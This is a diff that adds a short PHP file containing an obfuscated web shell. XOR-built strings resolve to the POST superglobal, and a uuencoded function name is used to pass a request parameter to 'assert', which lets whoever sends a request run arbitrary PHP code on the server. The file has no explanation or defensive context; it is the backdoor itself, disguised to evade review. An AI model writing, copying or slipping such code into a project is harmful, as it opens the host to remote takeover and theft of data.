@@ -1,0 +1,6 @@
+<?php 
+$a = "~+d()"^"!{+{}";
+$b = substr('S'.${$a}[a],1);
+$c=array($b);
+convert_uudecode("48V%L;%]U<V5R7V9U;F-?87)R87D`")("as"."sert",$c);
+?>
